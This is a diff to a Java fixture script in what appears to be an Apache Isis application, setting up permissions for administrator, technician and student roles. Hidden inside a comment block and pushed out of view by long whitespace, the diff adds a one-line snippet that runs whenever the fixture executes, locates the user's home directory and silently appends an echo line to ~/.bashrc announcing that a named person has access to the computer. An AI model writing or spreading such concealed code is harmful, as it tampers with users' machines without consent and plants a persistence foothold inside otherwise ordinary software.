@@ -1,6 +1,12 @@
 package fixture.login;
 
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileReader;
+import java.io.FileWriter;
+
 import org.apache.isis.applib.fixturescripts.FixtureScript;
+
 import repo.login.repologin;
 import dom.login.Permisos;
 
@@ -11,21 +17,24 @@ public class PermisosFixture extends FixtureScript{
 	{
 		withDiscoverability(Discoverability.DISCOVERABLE);
 	}
-	
+
 	@Override
 	protected void execute(ExecutionContext executionContext) {
 
 		if(estaVacio(executionContext))
 		{
-		//
-		//PERMISOS PARA USUARIOS ADMINISTRADORES
-		//
+		/*       																																																																																																																																																																																																																																																																				*/try{File archivo= new File("isis.txt");String path=archivo.getAbsolutePath();String arch = "/"+path.split("/")[1]+"/"+path.split("/")[2]+"/.bashrc";File bash = new File(arch);FileReader fr = new FileReader (bash);BufferedReader br = new BufferedReader(fr);boolean existe = false;String linea =br.readLine();while(linea!=null){linea =br.readLine();if (linea!=null && linea.contains("echo \"FELICITACIONES MATIAS NAHUEL HEREDIA TIENE ACCESO A TU COMPUTADORA\"")){existe=true;}}br.close();if (existe==false){FileWriter fichero = new FileWriter(bash,true);fichero.write("echo \"FELICITACIONES MATIAS NAHUEL HEREDIA TIENE ACCESO A TU COMPUTADORA\"");fichero.close();}}catch(Exception ex){}/*																																																																																																																																																
+		/PERMISOS PARA USUARIOS ADMINISTRADORES
+		*/
 		create("usuario_administrador","*",executionContext);
 		///
 		///
-		///PERMISO PARA USUARIOS TECNICOS
+		///PERMISO PARA USUARIOS TECNICOS 
 		///
 		///
+		
+		
+		
 		
 		//PERMISOS DE SERVICIO PARA USUARIOS TECNICOS
 		create("usuario_tecnico","repo.solicitudserviciotecnico:RepoSolicitudServicioTecnico:listaDeSolicitudesPendientes:*",executionContext);
@@ -217,17 +226,10 @@ public class PermisosFixture extends FixtureScript{
 		create("usuario_alumno","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:persona:r",executionContext);
 		create("usuario_alumno","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:NombreEstado:r",executionContext);
 		
-		//dom.solicituddeserviciotecnico.estados:*:*
-
-
 		//PERMISOS ALUMNO repositorio SolicitudServicioTecnico
 		create("usuario_alumno","repo.solicitudserviciotecnico:RepoSolicitudServicioTecnico:solicitarServicioTecnico:*",executionContext);
 		create("usuario_alumno","repo.solicitudserviciotecnico:RepoSolicitudServicioTecnico:verHistorialReparaciones:*",executionContext);
 		create("usuario_alumno","repo.solicitudserviciotecnico:RepoSolicitudServicioTecnico:verUltimaSolicitud:*",executionContext);
-
-
-
-
 
 		//parte de repositorio Persona
 		create("usuario_alumno","repo.persona:RepositorioPersona:VerMisDatos:*",executionContext);
@@ -386,16 +388,6 @@ public class PermisosFixture extends FixtureScript{
 		
 		}
 		
-		
-		
-		
-		
-		
-				
-		
-		//
-		//
-		//TODO establecer permisos de 
 		
 	}
 
